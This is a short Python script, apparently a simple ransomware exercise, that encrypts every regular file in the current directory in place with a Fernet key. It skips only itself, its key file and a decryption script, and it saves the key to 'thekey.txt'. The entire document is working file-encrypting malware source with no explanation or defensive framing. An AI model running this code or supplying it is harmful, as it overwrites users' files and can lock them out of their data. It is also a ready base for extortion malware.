import os
from cryptography.fernet import Fernet

files= []

for file in os.listdir():
    if file == "rensom.py" or file=="thekey.txt" or file=="decruption.py":
        continue
    if os.path.isfile(file):
        files.append(file)
key = Fernet.generate_key()
with open('thekey.txt', "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents=thefile.read()
    contentencrypted= Fernet(key).encrypt(contents)
    with open(file, 'wb') as thefile:
        thefile.write(contentencrypted)
